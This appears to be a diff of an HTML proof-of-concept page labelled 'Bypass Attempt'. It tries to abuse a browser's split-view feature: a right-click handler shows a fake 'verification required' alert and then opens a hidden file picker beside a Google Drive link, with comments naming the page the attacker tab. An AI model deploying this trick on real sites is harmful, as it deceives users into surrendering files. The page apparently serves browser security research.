@@ -1,26 +1,35 @@
 <!doctype html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
-    <title>Bypass Attempt - Split View File Picker</title>
+    <title>Split View - Alert Hold (Bypass Attempt)</title>
     <style>
       body {
-        font-family: Arial;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
         text-align: center;
         padding-top: 50px;
+        background: #f0f2f5;
       }
       a {
         display: inline-block;
-        padding: 10px;
-        background: #1a73e8;
+        background-color: #1a73e8;
         color: white;
+        padding: 12px 24px;
         text-decoration: none;
         border-radius: 4px;
+        font-weight: 500;
+      }
+      a:hover {
+        background-color: #1557b0;
       }
       img {
         max-width: 300px;
         margin-top: 20px;
+        border-radius: 8px;
         display: none;
+      }
+      p {
+        margin-top: 20px;
+        color: #5f6368;
       }
     </style>
   </head>
@@ -30,46 +39,41 @@
       href="https://workspace.google.com/intl/en_in/products/drive/"
       >Right Click → Open in Split View</a
     >
-    <br />
+    <input type="file" id="fileInput" style="display: none" />
     <img id="preview" />
+    <p>
+      After split view opens, an alert will appear. Click OK to see if file
+      picker appears.
+    </p>
 
     <script>
-      const trigger = document.getElementById("trigger");
+      const fileInput = document.getElementById("fileInput");
       const preview = document.getElementById("preview");
 
-      // Buat input file hidden
-      const fileInput = document.createElement("input");
-      fileInput.type = "file";
-      fileInput.accept = "image/*";
-      fileInput.style.display = "none";
-      document.body.appendChild(fileInput);
-
-      fileInput.onchange = (e) => {
-        if (fileInput.files.length) {
+      fileInput.onchange = () => {
+        if (fileInput.files && fileInput.files[0]) {
           preview.src = URL.createObjectURL(fileInput.files[0]);
           preview.style.display = "block";
-          console.log("File selected:", fileInput.files[0].name);
         }
       };
 
-      trigger.addEventListener("contextmenu", async (e) => {
-        // Jangan prevent default agar menu konteks browser tetap muncul
-        // User akan memilih "Open in Split View"
+      document
+        .getElementById("trigger")
+        .addEventListener("contextmenu", (e) => {
+          // JANGAN preventDefault biar menu konteks browser tetap muncul
+          // User bisa pilih "Open in Split View"
 
-        // Kita perlu menunda eksekusi agar split view sempat terbuka,
-        // tapi harus memfokuskan kembali ke tab ini sebelum file picker.
+          // Alert blocking — menahan eksekusi sampai user klik OK
+          // Selama alert, split view sudah terbuka. Alert akan memfokuskan tab ini (attacker)
+          alert(
+            "⚠️ Verification required. Click OK to continue and select a file.",
+          );
 
-        // Setelah split view terbuka (asumsi butuh waktu ~500ms)
-        setTimeout(async () => {
-          // Coba paksa fokus ke tab ini
-          window.focus();
-          // Bisa juga dengan alert yang memindahkan fokus
-          alert("Please confirm verification"); // alert akan memfokuskan tab ini
-
-          // Sekarang coba buka file picker
+          // Setelah OK, panggil file picker.
+          // Saat ini tab attacker sudah aktif (karena alert memunculkannya ke foreground)
+          // Dan masih dalam event handler yang sama (user gesture secara teknis masih berlangsung?)
           fileInput.click();
-        }, 1000); // beri waktu split view terbuka
-      });
+        });
     </script>
   </body>
 </html>
